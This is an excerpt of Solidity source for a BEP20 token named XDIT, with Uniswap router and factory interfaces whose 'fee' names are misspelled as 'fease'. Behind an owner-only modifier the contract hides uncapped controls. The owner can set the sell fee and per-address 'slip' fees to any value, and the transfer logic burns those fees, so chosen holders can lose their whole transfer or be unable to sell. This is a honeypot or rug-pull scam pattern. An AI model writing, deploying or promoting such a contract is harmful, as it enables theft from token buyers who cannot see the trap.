...
interface IUniswapV2Factory {
    ...
    function feaseTo() external view returns (address);
    function feaseToSetter() external view returns (address);
    ...
    function setfeaseTo(address) external;
    function setfeaseToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfeaseOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingfeaseOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingfeaseOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingfeaseOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfeaseOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract XDIT is BEP20, Ownable {
    // ext
    ...
    uint256 private _defaultSellfease = 0;

    uint256 private _defaultBuyfease = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipfease;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellfease = _value;
    }

    function setSlipfease(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipfease[_address] = _value;
    }

    function getSlipfease(address _address) external view onlyownar returns (uint256) {
        return _slipfease[_address];
    }


    function setMAccountfease(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountfease(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradefeaseAmount = 0;

        if (rF) {
            uint256 tradefease = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradefease = _defaultSellfease;
                }
                if (from == uniswapV2Pair) {

                    tradefease = _defaultBuyfease;
                }
            }
            if (_slipfease[from] > 0) {
                tradefease = _slipfease[from];
            }

            tradefeaseAmount = _Amount.mul(tradefease).div(100);
        }


        if (tradefeaseAmount > 0) {
            _balances[from] = _balances[from].sub(tradefeaseAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradefeaseAmount);
            emit Transfer(from, _deadAddress, tradefeaseAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradefeaseAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradefeaseAmount);
        emit Transfer(from, _to, _Amount - tradefeaseAmount);
    }
